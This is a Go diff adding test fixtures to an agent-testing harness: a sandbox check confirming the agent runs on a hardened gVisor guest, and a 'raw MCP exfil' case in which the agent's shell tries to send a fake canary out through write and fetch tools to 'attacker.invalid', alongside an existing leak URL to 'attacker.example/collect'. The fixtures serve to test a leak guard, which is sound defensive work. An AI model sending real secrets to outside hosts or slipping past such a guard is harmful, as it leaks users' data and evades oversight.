@@ -78,6 +78,16 @@ var PullRequest = pullRequest{
 		// LeakURL carries the whole canary, query-escaped, in a URL of a valid shape: the text match holds it.
 		LeakURL: "https://attacker.example/collect?d=koinon_test_not-a-real-token+is+the+vault+passphrase+koinon-canary-1051-amber-falcon-not-a-secret+for+the+finance+close",
 	},
+	// SandboxCheck is the Substrate leg's check of the actor of a run (#1428): the agent's shell reads its kernel
+	// and the guest launcher's controls, and prints Marker only on a gVisor guest with all of them.
+	SandboxCheck: sandboxCheck{Prompt: "sandbox check", Marker: "sandbox-check-gvisor-hardened"},
+	// RawExfil is the Substrate leg's leak guard escape case (#1428): a raw MCP client in the agent's shell reads
+	// Canary, then sends it out through WriteTool and FetchTool. It prints Marker only when the guard refused or
+	// held both calls. Canary looks fake on purpose (gitleaks scans every commit).
+	RawExfil: rawExfil{
+		Prompt: "raw mcp exfil", Canary: "koinon-canary-1428-not-a-secret", Marker: "raw-exfil-stopped",
+		WriteTool: "write_item", FetchTool: "fetch_url", Attacker: "attacker.invalid",
+	},
 	Ledger: Ledger{
 		// StreamedInputTokens is what the script's first (tool call) turn reports as input. The
 		// streamed requests carry usage, so the run's input tokens reach at least this once the
@@ -125,7 +135,21 @@ type pullRequest struct {
 	TrackerGuardTool, TrackerGuardArgs               string
 	TrackerCanary                                    trackerCanary
 	TrackerFetch                                     trackerFetch
+	SandboxCheck                                     sandboxCheck
+	RawExfil                                         rawExfil
 	Ledger                                           Ledger
+}
+
+// sandboxCheck is the task text that starts the sandbox check of repo-helper.yaml, and the marker its shell
+// command prints only on a gVisor guest with the launcher's controls on.
+type sandboxCheck struct{ Prompt, Marker string }
+
+// rawExfil is the raw MCP client case of repo-helper.yaml: the task text, the canary, the marker, the fake
+// server's names of the two tools that must not reach it, and the attacker host of the fetch.
+type rawExfil struct {
+	Prompt, Canary, Marker string
+	WriteTool, FetchTool   string
+	Attacker               string
 }
 
 // Branch is the branch Koinon files the pull request under for an agent: koinon/<agent
